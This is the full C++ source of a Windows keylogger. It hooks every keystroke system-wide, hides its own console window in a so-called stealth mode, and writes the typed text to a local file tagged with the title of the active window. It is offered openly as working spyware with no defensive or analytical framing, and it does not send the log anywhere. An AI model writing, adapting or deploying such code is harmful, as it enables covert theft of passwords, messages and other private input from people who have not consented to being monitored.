#define _WIN32_WINNT 0x0500 // Required for console hiding
#include <iostream>
#include <windows.h>
#include <fstream>
#include <string>

// Global variables
HHOOK hHook;
HWND lastWindow = NULL; // To keep track of the last window we logged

// Helper function to hide the console window (Stealth Mode)
void StealthMode() {
    HWND stealth;
    AllocConsole();
    stealth = FindWindowA("ConsoleWindowClass", NULL);
    ShowWindow(stealth, 0);
}

// Helper function to log the active window title
void LogActiveWindow(std::ofstream &file) {
    HWND currWindow = GetForegroundWindow();
    
    // Only log if the user switched to a DIFFERENT window
    if (currWindow != lastWindow) {
        char windowTitle[256];
        GetWindowTextA(currWindow, windowTitle, sizeof(windowTitle));
        
        // Write the new window title with some formatting
        // We use a timestamp-like format for readability
        file << "\n\n[WINDOW: " << windowTitle << "] \n";
        
        lastWindow = currWindow;
    }
}

LRESULT CALLBACK KeyboardProc(int nCode, WPARAM wParam, LPARAM lParam) {
    if (nCode >= 0 && wParam == WM_KEYDOWN) {
        KBDLLHOOKSTRUCT *kbdStruct = (KBDLLHOOKSTRUCT *)lParam;
        
        // Open file in Append mode
        std::ofstream logfile;
        logfile.open("keylog.txt", std::ios::app);

        // 1. Check & Log Window Title first
        LogActiveWindow(logfile);

        // 2. Map Virtual Key codes to readable text
        if (kbdStruct->vkCode == VK_RETURN) {
            logfile << "\n";
        }
        else if (kbdStruct->vkCode == VK_SPACE) {
            logfile << " ";
        }
        else if (kbdStruct->vkCode == VK_BACK) {
            logfile << "[BACKSPACE]";
        }
        else if (kbdStruct->vkCode == VK_TAB) {
            logfile << "[TAB]";
        }
        else if (kbdStruct->vkCode == VK_SHIFT || kbdStruct->vkCode == VK_LSHIFT || kbdStruct->vkCode == VK_RSHIFT) {
            // Do nothing for shift (avoids logging [SHIFT] constantly)
        }
        else {
            // Retrieve the character
            char key = (char)kbdStruct->vkCode;
            
            // Basic case handling (optional: use ToAscii for better handling)
            // If Shift is held, we would usually capitalize, but for this simple version:
            if (key >= 65 && key <= 90) { // A-Z
                // If CapsLock is off, convert to lowercase (simple logic)
                if (!(GetKeyState(VK_CAPITAL) & 0x0001)) {
                    key += 32; 
                }
            }
            logfile << key;
        }

        logfile.close();
    }
    return CallNextHookEx(hHook, nCode, wParam, lParam);
}

int main() {
    // 1. Activate Stealth Mode (Hides the black window)
    // WARNING: To stop this, you must use Task Manager!
    StealthMode(); 

    // 2. Set the Hook
    hHook = SetWindowsHookEx(WH_KEYBOARD_LL, KeyboardProc, NULL, 0);

    if (hHook == NULL) {
        return 1;
    }

    // 3. Keep Alive
    MSG msg;
    while (GetMessage(&msg, NULL, 0, 0)) {
        TranslateMessage(&msg);
        DispatchMessage(&msg);
    }

    UnhookWindowsHookEx(hHook);
    return 0;
}